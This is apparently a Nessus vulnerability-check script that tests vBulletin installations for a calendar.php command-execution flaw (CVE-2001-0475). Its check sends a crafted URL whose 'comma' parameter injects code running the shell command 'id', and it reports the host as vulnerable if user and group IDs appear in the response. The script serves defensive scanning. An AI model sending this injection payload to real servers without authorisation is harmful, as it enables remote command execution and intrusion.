if(description)
{
 script_id(11179);
 script_bugtraq_id(2474);
 script_cve_id("CVE-2001-0475");
 script_version("$Revision: 1.11 $");
 name["english"] = "vBulletin's Calender Command Execution Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
A vulnerability in vBulletin enables attackers to craft special URLs 
that will execute commands on the server through the vBulletin PHP
script.
For more information see: http://www.securiteam.com/securitynews/5IP0B203PI.html

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "vBulletin's Calender  Command Execution Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 SecurITeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl", "vbulletin_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  req = string(dir, "/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL)exit(0);

  if (("uid=" >< buf) && ("gid=" >< buf)) security_hole(port);
}
